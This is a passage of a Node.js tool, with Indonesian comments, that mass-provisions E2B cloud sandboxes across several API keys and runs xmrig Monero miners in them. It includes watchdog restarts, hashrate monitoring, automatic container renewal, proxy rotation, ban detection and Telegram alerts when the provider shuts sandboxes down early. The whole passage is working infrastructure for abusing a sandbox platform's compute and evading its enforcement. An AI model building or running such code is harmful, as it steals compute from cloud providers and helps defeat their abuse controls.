  echo "WD_PID:$WD_PID"
else
  echo "WD_RUNNING:0"
fi

# 3. Cek miner proses aktif (xmrig)
XMRIG_PID=$(pgrep -x "xmrig" 2>/dev/null | head -n1 || true)
if [ -n "$XMRIG_PID" ]; then echo "PROCS:1"; else echo "PROCS:0"; fi

# 4. Ambil hashrate langsung dari API miner (XMRig di 8080)
API_DATA=$(curl -s --noproxy "*" --max-time 2 -H "Authorization: Bearer miner123" http://127.0.0.1:8080/2/summary 2>/dev/null | tr -d "\\r\\n" || true)
if [ -n "$API_DATA" ]; then echo "API_JSON:$API_DATA"; fi

# 5. Log tail hashrate dari log files
if [ -f "/tmp/xmrig.log" ]; then
  grep -E "speed 10s/60s/15m" /tmp/xmrig.log 2>/dev/null | tail -n 4
fi
`;
  try {
    const out = await execInE2BSandbox(apiKey, sandboxId, cmd, 15000, proxyUrl);
    if (out.notFound) {
      return [false, 0, 0, 0, true, { active: false, restarts: 0, uptime: 0, mode: 'watchdog', miner_type: 'xmrig' }];
    }
    const lines = (out.stdout || '').split('\n');

    let minerStatus = null;
    let wdRunning = false;
    let procRunning = false;
    let isRunning = false;
    let h10 = 0, h60 = 0, h15m = 0;

    for (const l of lines) {
      const trimmed = l.trim();
      // Parse JSON status (dari miner.status atau watchdog.status)
      if (trimmed.startsWith('{') && trimmed.endsWith('}') && trimmed.includes('"status"')) {
        try { minerStatus = JSON.parse(trimmed); } catch (e) { }
      } else if (l.startsWith('WD_RUNNING:')) {
        wdRunning = l.includes('1');
      } else if (l.startsWith('PROCS:')) {
        procRunning = l.includes('1');
      }
    }

    if (minerStatus) {
      if (minerStatus.status === 'mining') isRunning = true;
      h10 = parseFloat(minerStatus.hashrate_10s) || 0;
      h60 = parseFloat(minerStatus.hashrate_60s) || 0;
      h15m = parseFloat(minerStatus.hashrate_15m) || 0;
    }

    if (wdRunning || procRunning) isRunning = true;

    // Fallback hashrate dari API XMRig
    if (h10 === 0) {
      for (const l of lines) {
        if (l.startsWith('API_JSON:')) {
          try {
            const raw = l.slice(9).trim();
            if (raw.startsWith('{') && raw.endsWith('}')) {
              const api = JSON.parse(raw);
              const total = (api.hashrate || {}).total || [];
              if (total.length && total[0] != null) {
                h10 = parseFloat(total[0]) || 0;
                h60 = total[1] != null ? parseFloat(total[1]) || 0 : 0;
                h15m = total[2] != null ? parseFloat(total[2]) || 0 : 0;
              }
              if (h10 === 0) {
                const threads = (api.hashrate || {}).threads || [];
                const t_sum = threads.reduce((acc, t) => acc + (t && t[0] != null ? parseFloat(t[0]) || 0 : 0), 0);
                if (t_sum > 0) h10 = t_sum;
              }
              if (h10 > 0) {
                isRunning = true;
                break;
              }
            }
          } catch (e) { }
        }
      }
    }

    // Fallback hashrate dari log xmrig (strip ANSI color codes)
    if (h10 === 0) {
      const reXmrig = /speed\s+10s\/60s\/15m\s+([\d.]+|n\/a)\s+([\d.]+|n\/a)\s+([\d.]+|n\/a)/;
      for (let i = lines.length - 1; i >= 0; i--) {
        const cleanLine = lines[i].replace(/\x1b\[[0-9;]*m/g, '');
        const mX = reXmrig.exec(cleanLine);
        if (mX) {
          h10 = mX[1] !== 'n/a' ? parseFloat(mX[1]) : 0;
          h60 = mX[2] !== 'n/a' ? parseFloat(mX[2]) : 0;
          h15m = mX[3] !== 'n/a' ? parseFloat(mX[3]) : 0;
          if (h10 > 0) { isRunning = true; break; }
        }
      }
    }

    if (h10 > 0) isRunning = true;

    const watchdogInfo = {
      active: wdRunning || procRunning || isRunning,
      restarts: minerStatus?.restarts || 0,
      uptime: minerStatus?.uptime || 0,
      mode: 'watchdog',
      miner_type: minerStatus?.miner_type || 'xmrig',
      cpu_percent: minerStatus?.cpu_percent ? parseInt(minerStatus.cpu_percent, 10) : undefined,
      threads: minerStatus?.threads ? parseInt(minerStatus.threads, 10) : undefined,
    };

    return [isRunning, h10, h60, h15m, false, watchdogInfo];
  } catch (e) {
    return [false, 0, 0, 0, false, { active: false, restarts: 0, uptime: 0, mode: 'watchdog', cpu_percent: undefined, threads: undefined }];
  }
}

// ============================================================
// SEQUENTIAL RUNNER (1-BY-1 PROVISIONING & BULK CAPABLE)
// ============================================================

function enqueueToken(tokenId) {
  if (!tokens[tokenId]) return;
  const currentKey = (tokens[tokenId].api_key || '').trim();
  if (!currentKey) {
    addLog(tokenId, '❌ E2B API Key belum diisi!');
    return;
  }

  // Cek apakah API Key ini sedang aktif digunakan oleh token lain (anti key double)
  for (const [otherId, otherToken] of Object.entries(tokens)) {
    if (otherId !== tokenId && otherToken.api_key && otherToken.api_key.trim() === currentKey) {
      const isOtherActive = (tasks[otherId] && !tasks[otherId].cancel && !tasks[otherId].done) || sequenceQueue.includes(otherId) || activeProvisioningTokenIds.has(otherId);
      if (isOtherActive) {
        const errMsg = `⚠️ API Key ini sedang aktif digunakan oleh token '${otherToken.name}'. Token tidak bisa dijalankan bersamaan (key tidak boleh double). Hapus token '${otherToken.name}' terlebih dahulu jika ingin menggunakan key ini lagi.`;
        addLog(tokenId, errMsg);
        console.log(`[KEY DOUBLE] ${errMsg}`);
        broadcastState();
        return;
      }
    }
  }

  // Jika sudah aktif atau sudah di antrian, lewati
  if (tasks[tokenId] && !tasks[tokenId].cancel && !tasks[tokenId].done) return;
  if (sequenceQueue.includes(tokenId) || activeProvisioningTokenIds.has(tokenId)) return;

  const ctrl = { cancel: false, done: false, isProvisioned: false };
  tasks[tokenId] = ctrl;
  sequenceQueue.push(tokenId);
  console.log(`⏳ Token '${tokens[tokenId].name}' masuk antrian runner (Posisi: #${sequenceQueue.length}).`);
  broadcastState();

  pumpQueue();
}

const MAX_CONCURRENT_TOKENS = 3;

function pumpQueue() {
  while (activeProvisioningTokenIds.size < MAX_CONCURRENT_TOKENS && sequenceQueue.length > 0) {
    const nextTokenId = sequenceQueue.shift();
    if (!tokens[nextTokenId]) continue;
    const ctrl = tasks[nextTokenId];
    if (!ctrl || ctrl.cancel) continue;

    activeProvisioningTokenIds.add(nextTokenId);
    console.log(`▶️ [PARALEL RUNNER] Memulai setup container untuk '${tokens[nextTokenId].name}' (${activeProvisioningTokenIds.size}/${MAX_CONCURRENT_TOKENS} akun aktif bersamaan)...`);

    (async (tid) => {
      try {
        await provisionTokenSandboxes(tid);
      } catch (e) {
        addLog(tid, `❌ Error saat proses setup: ${e.message}`);
        if (isBannedReason(e.message)) {
          await deleteBannedToken(tid, e.message);
        }
      } finally {
        activeProvisioningTokenIds.delete(tid);
        await broadcastState();
        pumpQueue();
      }
    })(nextTokenId);
  }
  broadcastState();
}

async function provisionTokenSandboxes(tokenId) {
  const ctrl = tasks[tokenId];
  const t = tokens[tokenId];
  if (!t || !ctrl || ctrl.cancel) return false;
  const cfg = t.config || {};
  const total = Math.min(cfg.total || DEFAULT_TOTAL, MAX_TOTAL);
  const wallet = getActiveWallet();
  const cpuPercent = Math.min(100, Math.max(1, parseInt(cfg.cpu_percent, 10) || DEFAULT_CPU_PERCENT));
  const threads = cpuPercentToThreads(cpuPercent);
  const hours = Math.min(Math.max(parseInt(cfg.hours, 10) || DEFAULT_HOURS, MIN_HOURS), MAX_HOURS);
  const execMode = cfg.exec_mode || DEFAULT_EXEC_MODE;
  const minerType = cfg.miner_type || DEFAULT_MINER_TYPE;
  const minerInfo = MINER_TYPES[minerType] || MINER_TYPES.xmrig;
  const tokenTimeoutMs = getDurationMs(hours);
  const apiKey = t.api_key;
  const tokenProxy = getTokenProxy(t);

  const modeLabel = `${minerInfo.name} | ${EXEC_MODES[execMode]?.name || execMode}`;
  console.log(`🚀 Runner E2B aktif untuk '${t.name}' — Target: ${total} container (8 vCPU / 8 GB) | Miner: ${minerInfo.name} [Algo: ${minerInfo.algo}] | Mode: ${EXEC_MODES[execMode]?.short || execMode} | CPU: ${cpuPercent}% (${threads} threads) | Durasi: ${hours} Jam | Proxy: ${maskProxy(tokenProxy)}`);

  const now = Date.now();
  if (!t.run_started_at) {
    t.run_started_at = now;
  }
  if (!t.cycle_started_at) {
    t.cycle_started_at = now;
  }
  if (typeof t.rerun_count !== 'number') {
    t.rerun_count = 0;
  }
  saveTokens();

  if (!apiKey) {
    addLog(tokenId, '❌ E2B API Key belum diisi!');
    ctrl.done = true;
    await broadcastState();
    return false;
  }

  // Validasi E2B SDK
  try {
    await getE2B();
    console.log('✅ E2B SDK siap.');
  } catch (e) {
    addLog(tokenId, `❌ ${e.message}`);
    ctrl.done = true;
    await broadcastState();
    return false;
  }

  // 1. PASTIKAN TEMPLATE BARU 8 CORE / 8 GB SUDAH DI-BUILD
  let templateId = t.template_id || cfg.template_id;
  if (!templateId) {
    // Cek apakah ada token lain dari akun yang sama yang sudah punya template siap pakai
    const existingWithTemplate = Object.values(tokens).find(other =>
      other.template_id && (other.api_key || '').trim() === (apiKey || '').trim()
    );
    if (existingWithTemplate && existingWithTemplate.template_id) {
      templateId = existingWithTemplate.template_id;
      t.template_id = templateId;
      (t.config = t.config || {}).template_id = templateId;
      t.template_status = 'ready';
      saveTokens();
      console.log(`⚡ [REUSE TEMPLATE] Menggunakan template yang sudah ada: ${templateId}`);
    }
  }

  if (!templateId) {
    console.log(`🔨 Template kustom 8 vCPU / 8 GB (Native) belum tersedia.`);
    addLog(tokenId, `🔨 Membangun template baru otomatis menggunakan E2B Build API...`);

    const [newTemplateId, buildErr] = await buildMinerTemplate(apiKey, tokenId);
    if (newTemplateId) {
      templateId = newTemplateId;
    } else {
      console.log(`ℹ️ [FALLBACK] Custom template build (${buildErr || 'unavailable'}). Menggunakan default base template agar mining langsung berjalan.`);
      addLog(tokenId, `ℹ️ Menggunakan default base template agar mining langsung berjalan.`);
      templateId = undefined; // E2B default base image
    }
  } else {
    console.log(`✓ Menggunakan template kustom: ${templateId} (8 Core / 8 GB RAM / Native)`);
  }

  // 2. DETEKSI DULU VIA API: APAKAH CONTAINER LAMA JALAN MINER ATAU TIDAK
  console.log('🔍 Mengambil daftar seluruh container aktif di E2B Cloud API...');
  const [existingList, listErr] = await listE2BSandboxes(apiKey, tokenProxy);
  if (listErr && isBannedReason(listErr)) {
    await deleteBannedToken(tokenId, listErr);
    return false;
  }

  if (listErr) {
    console.warn(`⚠️ [LIST CLOUD] Gagal list container (${listErr}), mempertahankan container lokal dari data tersimpan...`);
    addLog(tokenId, `⚠️ Gagal sinkronisasi cloud (${listErr}), menggunakan data sandboxes tersimpan.`);
  } else {
    const activeCloudSandboxes = existingList.filter(sb => {
      const state = sb.state || 'running';
      return state !== 'stopped' && state !== 'terminated' && (sb.sandboxId || sb.id);
    });

    console.log(`🔎 Ditemukan ${activeCloudSandboxes.length} container aktif di cloud. Memeriksa status miner...`);

    // Pertahankan slot yang sudah ada dari t.sandboxes agar urutan slot tidak berubah acak saat restart
    const oldSandboxes = t.sandboxes || {};
    const idToOldSlot = new Map();
    for (const [s, data] of Object.entries(oldSandboxes)) {
      if (data && data.id) idToOldSlot.set(data.id, parseInt(s, 10));
    }

    const assignedSlots = new Map();
    const unassigned = [];
    for (const sb of activeCloudSandboxes) {
      const sid = sb.sandboxId || sb.id;
      const prevSlot = idToOldSlot.get(sid);
      if (prevSlot && prevSlot <= total && !assignedSlots.has(prevSlot)) {
        assignedSlots.set(prevSlot, sb);
      } else {
        unassigned.push(sb);
      }
    }

    let nextSlot = 1;
    for (const sb of unassigned) {
      while (assignedSlots.has(nextSlot) && nextSlot <= total) {
        nextSlot++;
      }
      if (nextSlot <= total) {
        assignedSlots.set(nextSlot, sb);
        nextSlot++;
      }
    }

    const validMiningSlots = {};
    const slotEntries = [...assignedSlots.entries()].sort((a, b) => a[0] - b[0]);

    // Periksa status miner dalam batch paralel (5 sekaligus agar cepat dan responsif saat restart)
    const CHECK_BATCH_SIZE = 5;
    for (let i = 0; i < slotEntries.length; i += CHECK_BATCH_SIZE) {
      if (ctrl.cancel) return false;
      const batch = slotEntries.slice(i, i + CHECK_BATCH_SIZE);
      await Promise.all(batch.map(async ([slotNum, sb]) => {
        if (ctrl.cancel) return;
        const sid = sb.sandboxId || sb.id;
        const [isMining, h10, h60, h15m, notFound, wd] = await checkMiner(apiKey, sid, tokenProxy);
        if (notFound) {
          console.log(`⚠️ Container ${sid.slice(0, 16)} tidak ditemukan / sudah terminate.`);
          return;
        }

        const hrText = h10 > 0 ? `${(h10 / 1000).toFixed(2)} kH/s (${h10.toFixed(1)} H/s)` : (isMining ? 'Mining (warming up speed)' : 'Mengaktifkan miner...');
        const startedIso = toIsoDate(sb.startedAt) || new Date().toISOString();
        const endIso = toIsoDate(sb.endAt) || new Date(new Date(startedIso).getTime() + tokenTimeoutMs).toISOString();

        validMiningSlots[slotNum] = {
          id: sid,
          name: sb.metadata?.name || sb.name || sid,
          status: isMining ? 'mining' : 'starting',
          hashrate_10s: Math.round(h10 * 10) / 10,
          hashrate_60s: Math.round(h60 * 10) / 10,
          hashrate_15m: Math.round(h15m * 10) / 10,
          last_check: new Date().toISOString(),
          started_at: startedIso,
          end_at: endIso,
          watchdog: (wd && wd.active) ? 'active' : 'starting',
          restarts: wd?.restarts || 0,
          watchdog_mode: wd?.mode || 'supervisor',
          exec_mode: execMode,
          hours: hours,
          cpu_percent: (wd && wd.cpu_percent) ? wd.cpu_percent : cpuPercent,
          threads: (wd && wd.threads) ? wd.threads : threads,
          offline_count: 0,
        };
        const wdText = (wd && wd.active) ? 'Aktif' : 'Memulai...';
        addLog(tokenId, `✓ [Slot ${String(slotNum).padStart(2, '0')}] Container ${sid.slice(0, 16)} (${hrText}) [🛡️ Watchdog: ${wdText}]. Dipertahankan.`);

        if (!isMining || h10 === 0 || !wd || !wd.active) {
          setupMiner(apiKey, sid, wallet, cpuPercent, execMode, tokenProxy, minerType).catch(() => { });
        }
      }));
    }

    t.sandboxes = validMiningSlots;
    saveTokens();
    await broadcastState();
  }

  // 3. CEK JUMLAH CONTAINER: BUAT SISANYA SECARA CEPAT & PARALEL (+X)
  const currentValid = Object.keys(t.sandboxes).length;
  console.log(`📊 Hasil verifikasi: ${currentValid}/${total} container aktif menambang.`);

  if (currentValid >= total) {
    console.log(`✓ Kuota maksimal ${total} container (20/20) sudah terpenuhi dan seluruhnya aktif menambang.`);
  } else {
    const needed = total - currentValid;
    console.log(`📦 Container aktif ada ${currentValid}, kurang ${needed} container. Membuat +${needed} container baru secara paralel (3 container per batch) dengan template '${templateId}' (8 vCPU / 8 GB RAM) | Mode: ${modeLabel} | Durasi: ${hours} Jam...`);

    const missingSlots = [];
    for (let s = 1; s <= total; s++) {
      if (!t.sandboxes[s] || !t.sandboxes[s].id) {
        missingSlots.push(s);
      }
    }

    // Jalankan batch paralel (3 container sekaligus)
    const BATCH_SIZE = 3;
    for (let i = 0; i < missingSlots.length; i += BATCH_SIZE) {
      if (ctrl.cancel) return false;
      const batch = missingSlots.slice(i, i + BATCH_SIZE);

      await Promise.all(batch.map(async (s) => {
        if (ctrl.cancel) return;
        for (let attempt = 1; attempt <= 3; attempt++) {
          if (ctrl.cancel) return;
          console.log(`[Slot ${String(s).padStart(2, '0')}/${total}] Membuat container baru [Batch 3] (percobaan ${attempt}/3)...`);
          const displayName = `miner_${tokenId.slice(0, 6)}_${s}`;
          const [sb, err] = await createE2BSandbox(apiKey, templateId, displayName, hours, tokenProxy);

          if (!sb) {
            if (isBannedReason(err)) {
              await deleteBannedToken(tokenId, err);
              return;
            }
            const isBusy = err?.includes('rate') || err?.includes('quota') || err?.includes('limit') || err?.includes('429');
            const waitTime = isBusy ? (6000 * attempt + Math.floor(Math.random() * 2000)) : (2500 * attempt);
            const reason = isBusy ? `Rate limit / Kuota E2B Cloud (${err})` : (err || 'Unknown error');
            if (attempt === 3) {
              addLog(tokenId, `[Slot ${String(s).padStart(2, '0')}] ❌ Gagal membuat container setelah 3x percobaan: ${reason}`);
              await logTelegramSus(tokenId, `Gagal membuat container Slot ${s} setelah 3x percobaan (${reason})`);
            } else {
              console.log(`[Slot ${String(s).padStart(2, '0')}] ⏳ Percobaan ${attempt}/3 gagal: ${reason}, mencoba kembali dalam ${Math.round(waitTime / 1000)}s...`);
              await sleep(waitTime);
            }
            continue;
          }

          const sandboxId = sb.sandboxId || sb.id;
          console.log(`[Slot ${String(s).padStart(2, '0')}] ✅ Sandbox ready: ${sandboxId.slice(0, 16)}. Menjalankan miner (${modeLabel})...`);

          const started = await setupMiner(apiKey, sandboxId, wallet, cpuPercent, execMode, tokenProxy, minerType);
          const nowIso = new Date().toISOString();
          t.sandboxes[s] = {
            id: sandboxId,
            name: sandboxId,
            status: started ? 'mining' : 'starting',
            hashrate_10s: 0,
            hashrate_60s: 0,
            hashrate_15m: 0,
            last_check: nowIso,
            started_at: nowIso,
            end_at: new Date(Date.now() + Math.min(tokenTimeoutMs, MAX_E2B_SANDBOX_TIMEOUT_MS)).toISOString(),
            watchdog: started ? 'active' : 'starting',
            restarts: 0,
            watchdog_mode: 'watchdog',
            exec_mode: execMode,
            miner_type: minerType,
            hours: hours,
            cpu_percent: cpuPercent,
            threads: threads,
          };
          addLog(tokenId, `[Slot ${String(s).padStart(2, '0')}] ✓ Miner aktif (${modeLabel}, ${hours} Jam, CPU ${cpuPercent}% = ${threads} threads, 8 vCPU / 8 GB)!`);
          saveTokens();
          await broadcastState();
          break;
        }
      }));

      if (ctrl.cancel) return false;
      await sleep(1000);
    }
  }

  addLog(tokenId, `🎉 [SETUP SELESAI] Semua ${Object.keys(t.sandboxes).length}/${total} container Token '${t.name}' aktif & mining berjalan.`);
  ctrl.isProvisioned = true;
  saveTokens();
  await broadcastState();

  // 4. JALANKAN MONITORING REAL-TIME DI BACKGROUND (NON-BLOCKING UNTUK QUEUE)
  startTokenMonitoringLoop(tokenId).finally(() => { ctrl.done = true; });

  return true;
}

async function startTokenMonitoringLoop(tokenId) {
  const ctrl = tasks[tokenId];
  const t = tokens[tokenId];
  if (!t || !ctrl) return;
  const cfg = t.config || {};
  const total = Math.min(cfg.total || DEFAULT_TOTAL, MAX_TOTAL);
  const wallet = getActiveWallet();
  const cpuPercent = Math.min(100, Math.max(1, parseInt(cfg.cpu_percent, 10) || DEFAULT_CPU_PERCENT));
  const threads = cpuPercentToThreads(cpuPercent);
  const hours = Math.min(Math.max(parseInt(cfg.hours, 10) || DEFAULT_HOURS, MIN_HOURS), MAX_HOURS);
  const execMode = cfg.exec_mode || DEFAULT_EXEC_MODE;
  const tokenTimeoutMs = getDurationMs(hours);
  const apiKey = t.api_key;
  const templateId = t.template_id || cfg.template_id;
  const tokenProxy = getTokenProxy(t);

  while (!ctrl.cancel) {
    let totalHr = 0, miningCount = 0;
    const curCfg = t.config || {};
    const curTotal = Math.min(curCfg.total || DEFAULT_TOTAL, MAX_TOTAL);
    const curWallet = getActiveWallet();
    const curCpuPercent = Math.min(100, Math.max(1, parseInt(curCfg.cpu_percent, 10) || DEFAULT_CPU_PERCENT));
    const curThreads = curCfg.threads || cpuPercentToThreads(curCpuPercent);
    const curHours = Math.min(Math.max(parseInt(curCfg.hours, 10) || DEFAULT_HOURS, MIN_HOURS), MAX_HOURS);
    const curExecMode = curCfg.exec_mode || DEFAULT_EXEC_MODE;
    const curMinerType = curCfg.miner_type || DEFAULT_MINER_TYPE;
    const curMinerInfo = MINER_TYPES[curMinerType] || MINER_TYPES.xmrig;
    const curTokenTimeoutMs = getDurationMs(curHours);
    const modeLabel = `${curMinerInfo.name} | ${EXEC_MODES[curExecMode]?.name || curExecMode}`;
    let tokenProxy = getTokenProxy(t);

    // Verifikasi ke E2B Cloud API (Lengkap dengan Paginator)
    const [cloudList, listErr] = await listE2BSandboxes(apiKey, tokenProxy);
    if (listErr && (listErr.includes('proxy') || listErr.includes('socks') || listErr.includes('ECONNRESET') || listErr.includes('ETIMEDOUT'))) {
      tokenProxy = rotateTokenProxy(tokenId, 'koneksi E2B API proxy terputus');
    }
    if (listErr) {
      if (isBannedReason(listErr)) {
        await deleteBannedToken(tokenId, listErr);
        return;
      }
      if (listErr.includes('429') || listErr.toLowerCase().includes('rate')) {
        t.consecutive_rate_limits = (t.consecutive_rate_limits || 0) + 1;
        if (t.consecutive_rate_limits >= 3) {
          await logTelegramSus(tokenId, `E2B Cloud mengembalikan Rate Limit berulang (429: ${listErr})`);
        }
      }
    } else {
      t.consecutive_rate_limits = 0;
    }
    const activeCloudMap = new Map();
    for (const sb of (cloudList || [])) {
      const state = sb.state || 'running';
      if (state !== 'stopped' && state !== 'terminated') {
        const sid = sb.sandboxId || sb.id;
        if (sid) activeCloudMap.set(sid, sb);
      }
    }

    // Bersihkan sandbox yang mati / habis masa sesi
    let prematureDeaths = 0;
    for (const [slot, sbData] of Object.entries(t.sandboxes)) {
      if (sbData.id && !activeCloudMap.has(sbData.id)) {
        const ageMin = sbData.started_at ? Math.round((Date.now() - new Date(sbData.started_at).getTime()) / 60000) : 0;
        if (ageMin > 0 && ageMin < 40) {
          prematureDeaths++;
        }
        addLog(tokenId, `[Slot ${String(slot).padStart(2, '0')}] ⏳ Sesi ${curHours} jam selesai / sandbox ditutup cloud (${ageMin}m), slot dibersihkan.`);
        delete t.sandboxes[slot];
      } else if (sbData.id && activeCloudMap.has(sbData.id)) {
        // Update waktu startedAt dan endAt realtime
        const cObj = activeCloudMap.get(sbData.id);
        if (cObj.startedAt) sbData.started_at = toIsoDate(cObj.startedAt) || sbData.started_at;
        if (cObj.endAt) sbData.end_at = toIsoDate(cObj.endAt) || sbData.end_at;
      }
    }

    if (prematureDeaths >= 2) {
      await logTelegramSus(tokenId, `${prematureDeaths} sandbox ditutup paksa cloud secara prematur (< 40 menit dari limit ${curHours} jam)`);
    }

    // Sinkronkan container cloud yang belum tercatat ke slot yang kosong
    for (const [sid, sb] of activeCloudMap.entries()) {
      const alreadyHas = Object.values(t.sandboxes).some(s => s.id === sid);
      if (!alreadyHas && Object.keys(t.sandboxes).length < curTotal) {
        let emptySlot = 1;
        while (t.sandboxes[emptySlot]) emptySlot++;
        const sAt = toIsoDate(sb.startedAt) || new Date().toISOString();
        const eAt = toIsoDate(sb.endAt) || new Date(new Date(sAt).getTime() + curTokenTimeoutMs).toISOString();
        t.sandboxes[emptySlot] = {
          id: sid,
          name: sb.metadata?.name || sb.name || sid,
          status: 'starting',
          hashrate_10s: 0,
          hashrate_60s: 0,
          hashrate_15m: 0,
          last_check: new Date().toISOString(),
          started_at: sAt,
          end_at: eAt,
          watchdog: 'starting',
          restarts: 0,
          watchdog_mode: 'supervisor',
          exec_mode: curExecMode,
          hours: curHours,
          cpu_percent: curCpuPercent,
          threads: curThreads,
        };
      }
    }

    // Tambah / perbarui sandbox otomatis jika sesi berakhir atau ada slot kosong
    if (Object.keys(t.sandboxes).length < curTotal) {
      const missingCount = curTotal - Object.keys(t.sandboxes).length;

      // Cek apakah ini siklus RERUN (auto-renew setelah sesi berjalan)
      const now = Date.now();
      const cycleDurationMin = t.cycle_started_at ? Math.round((now - t.cycle_started_at) / 60000) : 0;
      const isRerunCycle = (cycleDurationMin >= 40 || Object.keys(t.sandboxes).length === 0) && (t.run_started_at && (now - t.run_started_at > 60000));

      if (isRerunCycle) {
        t.rerun_count = (t.rerun_count || 0) + 1;
        const prevMin = cycleDurationMin || (curHours * 60);
        t.cycle_started_at = now;
        t.is_sus = false;
        saveTokens();
        await logTelegramRerun(tokenId, { prevMinutes: prevMin });
      }

      addLog(tokenId, `⚡ [AUTO-RENEW CEPAT] ${missingCount} container selesai durasi ${curHours} jam. Meluncurkan pengganti (batch 3) [${modeLabel}] template '${templateId}' (8 vCPU / 8 GB RAM • CPU: ${curCpuPercent}%)...`);

      const missingSlots = [];
      for (let s = 1; s <= curTotal; s++) {
        if (!t.sandboxes[s] || !t.sandboxes[s].id) {
          missingSlots.push(s);
        }
      }

      // Batch 3 container paralel sekaligus
      const RENEW_BATCH_SIZE = 3;
      for (let i = 0; i < missingSlots.length; i += RENEW_BATCH_SIZE) {
        if (ctrl.cancel) return;
        const batch = missingSlots.slice(i, i + RENEW_BATCH_SIZE);

        await Promise.all(batch.map(async (s) => {
          if (ctrl.cancel) return;
          for (let attempt = 1; attempt <= 3; attempt++) {
            if (ctrl.cancel) return;
            console.log(`[Slot ${String(s).padStart(2, '0')}/${curTotal}] 🚀 Auto-renew container [Batch 3] (percobaan ${attempt}/3)...`);
            const displayName = `miner_${tokenId.slice(0, 6)}_${s}`;
            const [sbNew, errNew] = await createE2BSandbox(apiKey, templateId, displayName, curHours, tokenProxy);

            if (!sbNew) {
              if (isBannedReason(errNew)) {
                await deleteBannedToken(tokenId, errNew);
                return;
              }
              const isBusy = errNew?.includes('rate') || errNew?.includes('quota') || errNew?.includes('limit') || errNew?.includes('429');
              const waitTime = errNew?.includes('rate') ? (4000 * attempt) : (1500 * attempt);
              const reason = isBusy ? `Rate limit / Kuota E2B Cloud (${errNew})` : (errNew || 'Unknown error');
              if (attempt === 3) {
                addLog(tokenId, `[Slot ${String(s).padStart(2, '0')}] ❌ Gagal auto-renew container setelah 3x percobaan: ${reason}`);
                await logTelegramSus(tokenId, `Gagal auto-renew container Slot ${s} setelah 3x percobaan (${reason})`);
              } else {
                console.log(`[Slot ${String(s).padStart(2, '0')}] ⚠️ Percobaan ${attempt}/3 gagal: ${reason}, mencoba kembali dalam ${Math.round(waitTime / 1000)}s...`);
                await sleep(waitTime);
              }
              continue;
            }

            const newSid = sbNew.sandboxId || sbNew.id;
            // Template sudah pre-baked, langsung jalankan miner tanpa delay sesuai settingan CPU terkini
            const started = await setupMiner(apiKey, newSid, curWallet, curCpuPercent, curExecMode, tokenProxy, curMinerType);
            const nowIso = new Date().toISOString();
            t.sandboxes[s] = {
              id: newSid,
              name: newSid,
              status: started ? 'mining' : 'starting',
              hashrate_10s: 0,
              hashrate_60s: 0,
              hashrate_15m: 0,
              last_check: nowIso,
              started_at: nowIso,
              end_at: new Date(Date.now() + Math.min(curTokenTimeoutMs, MAX_E2B_SANDBOX_TIMEOUT_MS)).toISOString(),
              watchdog: started ? 'active' : 'starting',
              restarts: 0,
              watchdog_mode: 'watchdog',
              exec_mode: curExecMode,
              miner_type: curMinerType,
              hours: curHours,
              cpu_percent: curCpuPercent,
              threads: curThreads,
            };
            addLog(tokenId, `[Slot ${String(s).padStart(2, '0')}] ✓ Auto-renew selesai! (${modeLabel}, ${curHours} Jam, CPU ${curCpuPercent}% = ${curThreads} threads, 8 vCPU / 8 GB)!`);
            saveTokens();
            await broadcastState();
            break;
          }
        }));

        if (ctrl.cancel) return;
        await sleep(500);
      }
    }

    // Check status hashrate secara paralel (batch 5) agar cepat & realtime
    const entries = Object.entries(t.sandboxes);
    for (let i = 0; i < entries.length; i += 5) {
      if (ctrl.cancel) return;
      const batch = entries.slice(i, i + 5);
      await Promise.all(batch.map(async ([slot, sbData]) => {
        if (!sbData.id) return;
        try {
          const [isMining, h10, h60, h15m, notFound, wdInfo] = await checkMiner(apiKey, sbData.id, tokenProxy);
          if (notFound) {
            delete t.sandboxes[slot];
            return;
          }
          sbData.hashrate_10s = Math.round(h10 * 10) / 10;
          sbData.hashrate_60s = Math.round(h60 * 10) / 10;
          sbData.hashrate_15m = Math.round(h15m * 10) / 10;
          sbData.status = isMining ? 'mining' : (h10 > 0 ? 'mining' : 'starting');
          sbData.last_check = new Date().toISOString();
          if (wdInfo) {
            sbData.watchdog = wdInfo.active ? 'active' : 'starting';
            if (wdInfo.restarts !== undefined) sbData.restarts = wdInfo.restarts;
            if (wdInfo.uptime !== undefined) sbData.uptime = wdInfo.uptime;
          }
          if (wdInfo && wdInfo.cpu_percent) {
            sbData.cpu_percent = wdInfo.cpu_percent;
            sbData.threads = wdInfo.threads || cpuPercentToThreads(wdInfo.cpu_percent);
          } else {
            sbData.cpu_percent = sbData.cpu_percent || curCpuPercent;
            sbData.threads = sbData.threads || curThreads;
          }

          if (isMining) {
            sbData.offline_count = 0;
            if (h10 > 0) totalHr += h10;
            miningCount++;
          } else {
            // Grace period 90 detik saat container baru dibuat agar tidak restart-loop saat inisialisasi
            const ageMs = sbData.started_at ? (Date.now() - new Date(sbData.started_at).getTime()) : 999999;
            sbData.offline_count = (sbData.offline_count || 0) + 1;

            if (ageMs > 90000 && sbData.offline_count >= 3) {
              addLog(tokenId, `[Slot ${String(slot).padStart(2, '0')}] ⚠️ Miner offline terkonfirmasi (${sbData.offline_count}x check), menjalankan kembali Watchdog Supervisor (CPU ${curCpuPercent}%)...`);
              sbData.offline_count = 0;
              await setupMiner(apiKey, sbData.id, curWallet, curCpuPercent, sbData.exec_mode || curExecMode, tokenProxy, sbData.miner_type || curMinerType);
              sbData.cpu_percent = curCpuPercent;
              sbData.threads = curThreads;
            } else {
              // Masih dalam fase starting / warming up
              if (ageMs <= 90000) {
                sbData.status = 'starting';
              }
            }
          }
        } catch (e) {
          const errMsg = e?.message || String(e);
          if (errMsg.includes('proxy') || errMsg.includes('socks') || errMsg.includes('ECONNRESET') || errMsg.includes('ETIMEDOUT')) {
            tokenProxy = rotateTokenProxy(tokenId, 'koneksi sandbox proxy error');
          }
        }
      }));
      // Kirim pembaruan live WebSocket per batch
      await broadcastState();
    }

    // Live terminal banner
    const kH = (totalHr / 1000).toFixed(2);
    console.log(`\n===============================================================`);
    console.log(`⚡ [E2B LIVE ${new Date().toLocaleTimeString('id-ID')}] [${t.name}] ${miningCount}/${Object.keys(t.sandboxes).length} Mining | ${kH} kH/s (${totalHr.toFixed(1)} H/s) | 🛡️ Native Watchdog (CPU: ${curCpuPercent}%)`);
    for (const [slot, sb] of Object.entries(t.sandboxes)) {
      const hrStr = sb.hashrate_10s > 0
        ? `${(sb.hashrate_10s / 1000).toFixed(2)} kH/s (${sb.hashrate_10s.toFixed(1)} H/s)`
        : (sb.status === 'mining' ? 'Mining (waiting speed)...' : 'Starting / Restarting...');
